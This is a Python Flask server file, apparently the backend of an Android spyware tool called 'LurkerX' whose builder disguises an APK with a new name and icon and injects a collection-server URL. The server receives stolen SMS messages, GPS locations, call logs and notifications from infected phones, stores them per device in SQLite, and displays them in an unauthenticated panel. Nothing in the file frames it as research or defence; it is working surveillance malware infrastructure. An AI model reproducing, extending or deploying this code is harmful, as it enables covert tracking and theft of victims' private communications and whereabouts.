from flask import Flask, request, jsonify, render_template
import sqlite3
from pathlib import Path
import re
import traceback
import argparse, sys
from validation import validate_token

def parse_args_and_validate():
    parser = argparse.ArgumentParser(description="LurkerX APK modifier")
    parser.add_argument("--token", required=True, help="Encrypted user token")
    parser.add_argument("--tool", default="LurkerX", help="Tool name to validate against")

    parser.add_argument("--name", required=True, help="New app name")
    parser.add_argument("--icon", required=True, help="Path to launcher icon (png)")
    parser.add_argument("--url", required=True, help="Server URL to inject into assets/url.txt")

    args = parser.parse_args()

    if not validate_token(args.token, args.tool):
        print("Error: Invalid or expired token.")
        sys.exit(1)

    print("Token is valid! Continuing...")
    return args

app = Flask(__name__)

# --- paths ---
home_dir = Path.home()
documents_dir = home_dir / "Documents"
BASE_DIR = (documents_dir if documents_dir.exists() else home_dir) / "LurkerX" / "logs"
BASE_DIR.mkdir(parents=True, exist_ok=True)

print(f"Logs directory: {BASE_DIR}")

# --- helpers ---
def safe_device_name(name: str) -> str:
    return re.sub(r"[^a-zA-Z0-9_-]", "_", name.strip())[:60]

def get_device_db(device_name: str):
    db_path = BASE_DIR / f"{device_name}.db"
    conn = sqlite3.connect(db_path, timeout=10, check_same_thread=False)

    conn.executescript("""
        CREATE TABLE IF NOT EXISTS sms (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            address TEXT,
            body TEXT,
            date INTEGER,
            type TEXT,
            UNIQUE(address, body, date)
        );

        CREATE TABLE IF NOT EXISTS gps (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            latitude TEXT,
            longitude TEXT,
            accuracy TEXT,
            timestamp INTEGER,
            UNIQUE(timestamp)
        );

        CREATE TABLE IF NOT EXISTS calls (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            number TEXT,
            call_type TEXT,
            duration INTEGER,
            timestamp INTEGER,
            UNIQUE(number, timestamp, duration)
        );

        CREATE TABLE IF NOT EXISTS notifs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            package TEXT,
            title TEXT,
            text TEXT,
            timestamp INTEGER,
            UNIQUE(package, title, timestamp)
        );
    """)

    conn.commit()
    return conn

from collections import defaultdict
from datetime import datetime

def get_log_structure():
    """
    returns a nested dictionary:
    -> structure[device][year][month][day] = [info_types...]
    info_types are the tables with entries on that day, e.g., sms, gps, calls, notifs
    """
    structure = defaultdict(lambda: defaultdict(lambda: defaultdict(lambda: defaultdict(list))))
    
    for db_file in BASE_DIR.glob("*.db"):
        device_name = db_file.stem  # device.db -> device
        conn = sqlite3.connect(db_file)
        conn.row_factory = sqlite3.Row
        cur = conn.cursor()
        
        # for each table, get the min and max timestamp
        for table, ts_field in [("sms", "date"), ("gps", "timestamp"), ("calls", "timestamp"), ("notifs", "timestamp")]:
            try:
                cur.execute(f"SELECT {ts_field} FROM {table} ORDER BY {ts_field} ASC")
                rows = cur.fetchall()
                for row in rows:
                    ts = row[ts_field]
                    if not ts:
                        continue
                    dt = datetime.fromtimestamp(ts / 1000 if ts > 1e10 else ts)  # handle ms or s
                    year = str(dt.year)
                    month = f"{dt.month:02d}"
                    day = f"{dt.day:02d}"
                    # add table name as "file" placeholder
                    if table not in structure[device_name][year][month][day]:
                        structure[device_name][year][month][day].append(table)
            except Exception as e:
                print(f"Error reading {table} in {device_name}: {e}")
        conn.close()
    
    return structure

# --- receive Data ---
@app.route("/receive_data/<item>", methods=["POST"])
def receive_data(item):
    device_model = request.headers.get("C-Device")
    if not device_model:
        return jsonify({"error": "Missing device header"}), 400

    payload = request.get_json(silent=True)
    if not payload:
        return jsonify({"error": "Invalid JSON payload"}), 400

    messages = payload if isinstance(payload, list) else payload.get("messages")
    if not isinstance(messages, list):
        return jsonify({"error": "Invalid payload structure"}), 400

    device_name = safe_device_name(device_model)
    conn = get_device_db(device_name)
    cur = conn.cursor()

    inserted = skipped = 0

    try:
        for row in messages:
            if item == "sms":
                cur.execute(
                    "INSERT OR IGNORE INTO sms (address, body, date, type) VALUES (?, ?, ?, ?)",
                    (row.get("address"), row.get("body"), row.get("date"), row.get("type", "sms"))
                )
            elif item == "gps":
                cur.execute(
                    "INSERT OR IGNORE INTO gps (latitude, longitude, accuracy, timestamp) VALUES (?, ?, ?, ?)",
                    (row.get("latitude"), row.get("longitude"), row.get("accuracy"), row.get("timestamp"))
                )
            elif item == "calls":
                cur.execute(
                    "INSERT OR IGNORE INTO calls (number, call_type, duration, timestamp) VALUES (?, ?, ?, ?)",
                    (row.get("number"), row.get("type"), row.get("duration"), row.get("timestamp"))
                )
            elif item == "notifs":
                cur.execute(
                    "INSERT OR IGNORE INTO notifs (package, title, text, timestamp) VALUES (?, ?, ?, ?)",
                    (row.get("package"), row.get("title"), row.get("text"), row.get("timestamp"))
                )
            else:
                continue

            inserted += 1 if cur.rowcount == 1 else 0
            skipped += 1 if cur.rowcount == 0 else 0

    except Exception as e:
        conn.close()
        return jsonify({"error": str(e)}), 500

    conn.commit()
    conn.close()

    return jsonify({"status": "ok", "device": device_name, "item": item, "inserted": inserted, "skipped": skipped})

# --- get info ---
@app.route("/get_info/<info_type>", methods=["GET"])
def get_info(info_type):
    device_model = request.headers.get("C-Device")
    if not device_model:
        return jsonify({"error": "Missing device header"}), 400

    min_ts = request.args.get("min_timestamp", type=int)
    device_name = safe_device_name(device_model)
    conn = get_device_db(device_name)
    conn.row_factory = sqlite3.Row
    cur = conn.cursor()

    TABLES = {"sms": "date", "gps": "timestamp", "calls": "timestamp", "notifs": "timestamp"}
    if info_type not in TABLES:
        conn.close()
        return jsonify({"error": "Invalid info type"}), 400

    ts_field = TABLES[info_type]

    try:
        if min_ts is not None:
            cur.execute(f"SELECT * FROM {info_type} WHERE {ts_field} >= ? ORDER BY {ts_field} DESC", (min_ts,))
        else:
            cur.execute(f"SELECT * FROM {info_type} ORDER BY {ts_field} DESC")
        rows = [dict(row) for row in cur.fetchall()]
    except Exception as e:
        conn.close()
        return jsonify({"error": str(e)}), 500

    conn.close()
    return jsonify({"device": device_name, "type": info_type, "count": len(rows), "data": rows})

# --- panel ---
@app.route("/")
def index():
    try:
        structure = get_log_structure()
        return render_template("base.html", structure=structure)
    except Exception:
        traceback.print_exc()
        return "Error loading panel.", 500

# --- run ---
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
